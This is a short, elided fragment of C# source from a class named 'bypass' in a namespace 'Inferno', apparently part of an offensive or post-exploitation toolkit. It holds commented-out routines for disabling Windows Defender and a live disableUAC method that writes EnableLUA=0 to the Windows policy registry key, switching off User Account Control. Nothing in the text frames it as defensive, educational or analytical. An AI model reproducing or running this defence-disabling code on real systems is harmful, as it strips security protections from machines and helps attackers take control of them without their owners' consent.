...
namespace Inferno
{
    internal class bypass
    {
        ...
        //    {
        //        output.error = true;
        //        core.Exit("Access denied, administrator rights needed to disable Windows Defender!", output, 2);
        //    }
        ...
        //    CheckDefender();
        //    core.Exit("Windows Defender disabled!", output);
        //}
        ...
        public static void disableUAC()
        {
            ...
            {
                output.error = true;
                core.Exit("Access denied, administrator rights needed to change UAC mode!", output, 2);
            }

            RegistryEdit(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "0");
